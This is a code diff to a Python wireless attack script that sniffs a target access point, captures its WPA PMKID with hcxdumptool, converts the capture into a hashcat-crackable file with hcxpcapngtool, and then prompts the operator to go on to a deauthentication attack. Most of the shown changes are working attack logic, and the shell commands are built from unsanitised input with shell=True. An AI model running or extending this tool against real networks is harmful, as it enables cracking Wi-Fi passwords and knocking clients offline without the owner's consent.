@@ -107,7 +107,6 @@ def check_args():
 
 
 def sniffer():
-    print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
     sniff(iface=iface, prn=packethandler, timeout=timeout)
 
 
@@ -139,10 +138,19 @@ def try_pmkid(iface, pcap_file, channel, ap):
                 subtype = packet.wlan.fc_type_subtype.showname_value
 
                 if 'QoS Data' in subtype:
-                    print(f"Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}"
-                          f"*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}")
+                    print(f"{bcolors.WARNING}Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}"
+                          f"*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}{bcolors.ENDC}")
+                    subprocess.call(f"hcxpcapngtool -o {ap.upper()}_pmkid.22000 {pmkid_file}", shell=True)
+                    deauth_next = str(input("Continue to Deauth attack?(y/n)"))
+
+                    if deauth_next.lower() == 'n':
+                        print("EXITING")
+                        sys.exit(2)
+
                     return
+            
             except:
+                sys.exit(2)
                 pass
 
         print("Didn't find PMKID!")
@@ -152,7 +160,6 @@ def try_pmkid(iface, pcap_file, channel, ap):
     pmkid_file = os.path.splitext(pcap_file)[0] + '.pmkid.pcapng'
     ap_file.close()
     mac = os.path.abspath(os.getcwd() + '/ap_filter.mac')
-    print(mac)
     try:
         subprocess.run(f"hcxdumptool -i {iface} -o {pmkid_file} -c {channel} --filtermode=2 --filterlist_ap={mac}",
                        shell=True, timeout=PMKID_TIMEOUT)
@@ -200,6 +207,7 @@ if __name__ == '__main__':
     pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'  # Add
     # current time in the middle of pcap file name
     os.system(f"iwconfig {iface} channel {channel}")  # Set WiFi Adapter On right Channel
+    print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
     try_pmkid(iface, pcap_file, channel, ap)
     t = threading.Thread(target=sniffer)  # Configure Sniffing in backgroud.
     t.start()  # Start Sniffing in the backgroud.
